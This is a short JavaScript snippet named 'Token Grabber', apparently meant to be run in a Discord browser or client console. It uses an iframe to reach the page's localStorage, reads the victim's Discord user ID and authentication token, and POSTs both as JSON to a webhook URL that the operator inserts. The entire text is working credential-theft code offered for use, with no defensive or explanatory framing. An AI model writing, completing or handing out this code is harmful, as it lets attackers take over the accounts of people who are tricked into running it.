location.reload();var i=document.createElement("iframe");document.body.appendChild(i),stop();var request=new XMLHttpRequest;request.open("POST",
//Insert your webhook link inside the quotes:
""
),request.setRequestHeader("Content-type","application/json");var params={username:"Token Grabber",avatar_url:"https://cdn.discordapp.com/avatars/730952132101931080/c48c7cd343673584948c80cb680c53e5.png?size=128",content:"**"+document.body.appendChild(document.createElement`iframe`).contentWindow.localStorage.user_id_cache+"** _-ID_ **"+i.contentWindow.localStorage.token+"** _-Token_"};request.send(JSON.stringify(params));
